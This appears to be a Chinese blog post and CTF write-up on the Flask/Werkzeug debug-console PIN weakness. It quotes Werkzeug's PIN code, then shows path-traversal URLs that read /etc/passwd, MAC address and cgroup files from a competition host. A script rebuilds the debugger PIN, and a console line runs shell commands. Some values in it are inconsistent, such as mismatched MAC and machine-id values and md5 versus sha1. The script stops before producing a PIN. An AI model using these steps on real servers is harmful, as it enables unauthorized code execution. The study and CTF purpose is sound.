
<!DOCTYPE html>
<html lang="zh-CN" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Flask debug PIN命令执行漏洞/CISCN2018：final-TimeKeeper/GYCTF2020-FlaskApp - H3ng</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="H3ng,"> 
    <meta name="description" content="Flask debug PIN命令执行漏洞在同一台机器上，多次重启Flask服务，PIN码值不改变，即PIN值固定。
Flask在生产环境中开启debug模式是一件非常危险的事，主要有3点原因：
1,"> 
    <meta name="author" content="H3ng"> 
    <link rel="alternative" href="/atom.xml" title="H3ng" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">

    
<link rel="stylesheet" href="/css/diaspora.css">

<meta name="generator" content="Hexo 5.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>

<body class="loading">
    <span id="config-title" style="display:none">H3ng</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
    <div title="播放/暂停" class="iconfont icon-play"></div>
    <h3 class="subtitle">Flask debug PIN命令执行漏洞/CISCN2018：final-TimeKeeper/GYCTF2020-FlaskApp</h3>
    <div class="social">
        <div>
            <div class="share">
                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <div class="article">
    <div class='main'>
        <h1 class="title">Flask debug PIN命令执行漏洞/CISCN2018：final-TimeKeeper/GYCTF2020-FlaskApp</h1>
        <div class="stuff">
            <span>十一月 11, 2021</span>
            
  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Flask-debug-PIN/" rel="tag">Flask debug PIN</a></li></ul>


        </div>
        <div class="content markdown">
            <h1 id="Flask-debug-PIN命令执行漏洞"><a href="#Flask-debug-PIN命令执行漏洞" class="headerlink" title="Flask debug PIN命令执行漏洞"></a>Flask debug PIN命令执行漏洞</h1><p>在同一台机器上，多次重启Flask服务，PIN码值不改变，即PIN值固定。</p>
<p>Flask在生产环境中开启debug模式是一件非常危险的事，主要有3点原因：</p>
<p>1、会泄露当前报错页面的源码，可供审计挖掘其他漏洞</p>
<p>2、会泄露Web应用的绝对路径，及Python解释器的路径（可以配合写文件漏洞向指定目录的文件内写入构造好的恶意代码，利用方式可以参考安全客的这篇文章：<a href="https://link.zhihu.com/?target=https://www.anquanke.com/post/id/86961">文件解压之过 Python中的代码执行</a>）</p>
<p>3、<strong>debug页面中包含Python的交互式shell，可以执行任意Python代码</strong></p>
<h2 id="代码分析："><a href="#代码分析：" class="headerlink" title="代码分析："></a>代码分析：</h2><pre><code>python39\Lib\site-packages\flask\aap.py
python39\Lib\site-packages\werkzeug\serving.py
python39\Lib\site-packages\werkzeug\debug\__init__.py</code></pre>
<p><code>debug\__init__.py</code>,<code>_get_pin</code>函数</p>
<pre class=" language-python"><code class="language-python">    <span class="token keyword">def</span> <span class="token function">pin</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>str<span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token operator">not</span> hasattr<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"_pin"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#hasattr() 函数用于判断对象是否包含对应的属性</span>
            pin_cookie <span class="token operator">=</span> get_pin_and_cookie_name<span class="token punctuation">(</span>self<span class="token punctuation">.</span>app<span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>_pin<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_pin_cookie <span class="token operator">=</span> pin_cookie  <span class="token comment" spellcheck="true"># type: ignore</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>_pin</code></pre>
<p>跟进<code>get_pin_and_cookie_name</code>：</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_pin_and_cookie_name</span><span class="token punctuation">(</span>
    app<span class="token punctuation">:</span> <span class="token string">"WSGIApplication"</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span>str<span class="token punctuation">,</span> str<span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span>None<span class="token punctuation">,</span> None<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns `None`.

    Second item in the resulting tuple is the cookie name for remembering.
    """</span>
    pin <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"WERKZEUG_DEBUG_PIN"</span><span class="token punctuation">)</span>
    rv <span class="token operator">=</span> None
    num <span class="token operator">=</span> None

    <span class="token comment" spellcheck="true"># Pin was explicitly disabled</span>
    <span class="token keyword">if</span> pin <span class="token operator">==</span> <span class="token string">"off"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> None<span class="token punctuation">,</span> None

    <span class="token comment" spellcheck="true"># Pin was provided explicitly</span>
    <span class="token keyword">if</span> pin <span class="token keyword">is</span> <span class="token operator">not</span> None <span class="token operator">and</span> pin<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true"># If there are separators in the pin, return it directly</span>
        <span class="token keyword">if</span> <span class="token string">"-"</span> <span class="token keyword">in</span> pin<span class="token punctuation">:</span>
            rv <span class="token operator">=</span> pin
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            num <span class="token operator">=</span> pin

    modname <span class="token operator">=</span> getattr<span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__module__"</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>cast<span class="token punctuation">(</span>object<span class="token punctuation">,</span> app<span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__module__<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#getattr() 函数用于返回一个对象属性值</span>
    username<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>str<span class="token punctuation">]</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true"># getuser imports the pwd module, which does not exist in Google</span>
        <span class="token comment" spellcheck="true"># App Engine. It may also raise a KeyError if the UID does not</span>
        <span class="token comment" spellcheck="true"># have a username, such as in Docker.</span>
        username <span class="token operator">=</span> getpass<span class="token punctuation">.</span>getuser<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> <span class="token punctuation">(</span>ImportError<span class="token punctuation">,</span> KeyError<span class="token punctuation">)</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> None

    mod <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get<span class="token punctuation">(</span>modname<span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># This information only exists to make the cookie unique on the</span>
    <span class="token comment" spellcheck="true"># computer, not as a security feature.</span>
    probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
        username<span class="token punctuation">,</span>
        modname<span class="token punctuation">,</span>
        getattr<span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">,</span> type<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span><span class="token punctuation">,</span>
        getattr<span class="token punctuation">(</span>mod<span class="token punctuation">,</span> <span class="token string">"__file__"</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span>

    <span class="token comment" spellcheck="true"># This information is here to make it harder for an attacker to</span>
    <span class="token comment" spellcheck="true"># guess the cookie name.  They are unlikely to be contained anywhere</span>
    <span class="token comment" spellcheck="true"># within the unauthenticated debug page.</span>
    private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>str<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> get_machine_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

    h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token operator">not</span> bit<span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>bit<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">:</span>
            bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>b<span class="token string">"cookiesalt"</span><span class="token punctuation">)</span>

    cookie_name <span class="token operator">=</span> f<span class="token string">"__wzd{h.hexdigest()[:20]}"</span>

    <span class="token comment" spellcheck="true"># If we need to generate a pin we salt it a bit more so that we don't</span>
    <span class="token comment" spellcheck="true"># end up with the same value and generate out 9 digits</span>
    <span class="token keyword">if</span> num <span class="token keyword">is</span> None<span class="token punctuation">:</span>
        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>b<span class="token string">"pinsalt"</span><span class="token punctuation">)</span>
        num <span class="token operator">=</span> f<span class="token string">"{int(h.hexdigest(), 16):09d}"</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>

    <span class="token comment" spellcheck="true"># Format the pincode in groups of digits for easier remembering if</span>
    <span class="token comment" spellcheck="true"># we don't have a result yet.</span>
    <span class="token keyword">if</span> rv <span class="token keyword">is</span> None<span class="token punctuation">:</span>
        <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> len<span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                rv <span class="token operator">=</span> <span class="token string">"-"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>
                    num<span class="token punctuation">[</span>x <span class="token punctuation">:</span> x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>
                    <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span>
                <span class="token punctuation">)</span>
                <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            rv <span class="token operator">=</span> num

    <span class="token keyword">return</span> rv<span class="token punctuation">,</span> cookie_name</code></pre>
<p>rv即PIN</p>
<p>主要代码为哈希：</p>
<pre class=" language-Python"><code class="language-Python">for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, text_type):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')</code></pre>
<p>其中的两个列表：</p>
<pre class=" language-python"><code class="language-python">probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    username<span class="token punctuation">,</span><span class="token comment" spellcheck="true">#root当前用户，通过读取/etc/passwd获取</span>
    modname<span class="token punctuation">,</span><span class="token comment" spellcheck="true">#flask.app一般情况为固定值</span>
    getattr<span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">'__name__'</span><span class="token punctuation">,</span> getattr<span class="token punctuation">(</span>app<span class="token punctuation">.</span>__class__<span class="token punctuation">,</span> <span class="token string">'__name__'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#Flask一般情况为固定值</span>
    getattr<span class="token punctuation">(</span>mod<span class="token punctuation">,</span> <span class="token string">'__file__'</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">##flask目录下的一个app.py的绝对路径，通过debug错误页面获取</span>
<span class="token punctuation">]</span>

private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    str<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#mac地址的十进制，通过读取/sys/class/net/eth0/address获取mac地址 如果不是映射端口 可以通过arp ip命令获取</span>
    get_machine_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#机器名，通过读取/proc/self/cgroup或/proc/sys/kernel/random/boot_id 或/etc/machine-id获取</span>
<span class="token punctuation">]</span></code></pre>
<p>get_machine_id()</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">_generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true"># Potential sources of secret information on linux.  The machine-id</span>
        <span class="token comment" spellcheck="true"># is stable across boots, the boot id is not</span>
        <span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token string">'/etc/machine-id'</span><span class="token punctuation">,</span> <span class="token string">'/proc/sys/kernel/random/boot_id'</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">with</span> open<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                    <span class="token keyword">return</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span> IOError<span class="token punctuation">:</span>
                <span class="token keyword">continue</span>

        <span class="token comment" spellcheck="true"># On OS X we can use the computer's serial number assuming that</span>
        <span class="token comment" spellcheck="true"># ioreg exists and can spit out that information.</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token comment" spellcheck="true"># Also catch import errors: subprocess may not be available, e.g.</span>
            <span class="token comment" spellcheck="true"># Google App Engine</span>
            <span class="token comment" spellcheck="true"># See https://github.com/pallets/werkzeug/issues/925</span>
            <span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span> PIPE
            dump <span class="token operator">=</span> Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ioreg'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">'IOPlatformExpertDevice'</span><span class="token punctuation">,</span> <span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                         stdout<span class="token operator">=</span>PIPE<span class="token punctuation">)</span><span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            match <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>b<span class="token string">'"serial-number" = &lt;([^>]+)'</span><span class="token punctuation">,</span> dump<span class="token punctuation">)</span>
            <span class="token keyword">if</span> match <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>
                <span class="token keyword">return</span> match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> <span class="token punctuation">(</span>OSError<span class="token punctuation">,</span> ImportError<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>

        <span class="token comment" spellcheck="true"># On Windows we can use winreg to get the machine guid</span>
        wr <span class="token operator">=</span> None
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">import</span> winreg <span class="token keyword">as</span> wr
        <span class="token keyword">except</span> ImportError<span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">import</span> _winreg <span class="token keyword">as</span> wr
            <span class="token keyword">except</span> ImportError<span class="token punctuation">:</span>
                <span class="token keyword">pass</span>
        <span class="token keyword">if</span> wr <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">with</span> wr<span class="token punctuation">.</span>OpenKey<span class="token punctuation">(</span>wr<span class="token punctuation">.</span>HKEY_LOCAL_MACHINE<span class="token punctuation">,</span>
                                <span class="token string">'SOFTWARE\\Microsoft\\Cryptography'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>
                                wr<span class="token punctuation">.</span>KEY_READ <span class="token operator">|</span> wr<span class="token punctuation">.</span>KEY_WOW64_64KEY<span class="token punctuation">)</span> <span class="token keyword">as</span> rk<span class="token punctuation">:</span>
                    machineGuid<span class="token punctuation">,</span> wrType <span class="token operator">=</span> wr<span class="token punctuation">.</span>QueryValueEx<span class="token punctuation">(</span>rk<span class="token punctuation">,</span> <span class="token string">'MachineGuid'</span><span class="token punctuation">)</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>wrType <span class="token operator">==</span> wr<span class="token punctuation">.</span>REG_SZ<span class="token punctuation">)</span><span class="token punctuation">:</span>
                        <span class="token keyword">return</span> machineGuid<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
                    <span class="token keyword">else</span><span class="token punctuation">:</span>
                        <span class="token keyword">return</span> machineGuid
            <span class="token keyword">except</span> WindowsError<span class="token punctuation">:</span>
                <span class="token keyword">pass</span>

    _machine_id <span class="token operator">=</span> rv <span class="token operator">=</span> _generate<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> rv</code></pre>
<p>首先尝试读取<code>/etc/machine-id</code>或者 <code>/proc/sys/kernel/random/boot_i</code>中的值，若有就直接返回</p>
<p>假如是在win平台下读取不到上面两个文件，就去获取注册表中<code>SOFTWARE\\Microsoft\\Cryptography</code>的值，并返回</p>
<p>脚本见：“CISCN2018：final-TimeKeeper”</p>
<h2 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h2><ul>
<li>Windows 11</li>
<li>Python  3.9.6</li>
<li>Flask 2.0.1</li>
</ul>
<h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><ol>
<li><p>下载flask：（我使用pycharm）</p>
</li>
<li><p>基于flask的web应用1.py</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> Hello

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>
<p>“return Hello”存在错误这里的hello未被定义，“debug=True”开启调试模式</p>
</li>
<li><p>部署到环境中</p>
<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111145529828.png" alt="image-20211111145529828"></p>
<p>由于代码存在错误会进入debug</p>
<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111145659650.png" alt="image-20211111145659650"></p>
<p>可以看到解释器和应用路径</p>
<p>console中输入pin</p>
<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111150227938.png" alt="image-20211111150227938"></p>
<p>都未执行成功</p>
<p>后面的没能完成采用文章截图吧</p>
<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111150209244.png" alt="image-20211111150209244"></p>
</li>
</ol>
<h2 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h2><p>在kali中跑出来了</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> subprocess <span class="token keyword">import</span> check_output

check_output<span class="token punctuation">(</span><span class="token string">'ifconfig'</span><span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>
<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111174707599.png" alt="image-20211111174707599"></p>
<h1 id="CISCN2018：final-TimeKeeper"><a href="#CISCN2018：final-TimeKeeper" class="headerlink" title="CISCN2018：final-TimeKeeper"></a>CISCN2018：final-TimeKeeper</h1><p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111124738927.png" alt="image-20211111124738927"></p>
<p>发现/console</p>
<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111124829534.png" alt="image-20211111124829534"></p>
<p>输错价格和id进入python debug</p>
<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111125158901.png" alt="image-20211111125158901"></p>
<p>获取flask目录下的一个app.py的绝对路径</p>
<pre><code>/usr/local/lib/python2.7/dist-packages/flask/app.py</code></pre>
<pre><code>http://111.200.241.244:49355/asserts/..%2f..%2f..%2f..%2f/etc/passwd</code></pre>
<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111130049191.png" alt="image-20211111130049191"></p>
<p>root和ctf可用</p>
<pre><code>http://111.200.241.244:49355/asserts/..%2f..%2f..%2f..%2f/sys/class/net/eth0/address</code></pre>
<p>02:d9:d4:24:40:16</p>
<p>转换为十进制</p>
<p>3134590304278</p>
<pre><code>http://111.200.241.244:49355/asserts/..%2f..%2f..%2f..%2f/proc/self/cgroup</code></pre>
<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111130245290.png" alt="image-20211111130245290"></p>
<pre><code>9c53f2ee41ea353b18b583926197cd776487bfab3058a8f319734dc65e71d302</code></pre>
<pre><code>http://111.200.241.244:49355/asserts/..%2f..%2f..%2f..%2f/proc/sys/kernel/random/boot_id</code></pre>
<pre><code>012c0db1-a401-4a82-b781-03d7681c398e</code></pre>
<p>信息：</p>
<pre class=" language-python"><code class="language-python">list <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token string">'root'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#当前用户，通过读取/etc/passwd获取 </span>
        <span class="token string">'flask.app'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#一般情况为固定值     </span>
        <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#一般情况为固定值 </span>
         <span class="token string">'/usr/local/lib/python2.7/dist-packages/flask/app.py'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#flask目录下的一个app.py的绝对路径，通过debug错误页面获取 </span>
         <span class="token string">'2583524700623'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#mac地址的十进制，通过读取/sys/class/net/eth0/address获取mac地址 如果不是映射端口 可以通过arp ip命令获取 </span>
         <span class="token string">'19ef9f241e480f2bca3437d27505a657eda03c05014023382e1b00667d4c82ad'</span><span class="token comment" spellcheck="true">#机器名，通过读取/proc/self/cgroup或/proc/sys/kernel/random/boot_id 或/etc/machine-id获取 ]</span>
</code></pre>
<p>生成PIN：</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'root'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true"># username</span>
    <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true"># modname</span>
    <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span>
    <span class="token string">'/usr/local/lib/python2.7/dist-packages/flask/app.py'</span> <span class="token comment" spellcheck="true"># getattr(mod, '__file__', None),</span>
<span class="token punctuation">]</span>

private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'3134590304278'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
    <span class="token string">'9c53f2ee41ea353b18b583926197cd776487bfab3058a8f319734dc65e71d302'</span><span class="token comment" spellcheck="true"># , /proc/self/cgroup</span>
<span class="token punctuation">]</span>

h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token operator">not</span> bit<span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>bit<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">:</span>
        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>b<span class="token string">'cookiesalt'</span><span class="token punctuation">)</span>

cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>

num <span class="token operator">=</span> None
<span class="token keyword">if</span> num <span class="token keyword">is</span> None<span class="token punctuation">:</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>b<span class="token string">'pinsalt'</span><span class="token punctuation">)</span>
    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> int<span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>

rv <span class="token operator">=</span>None
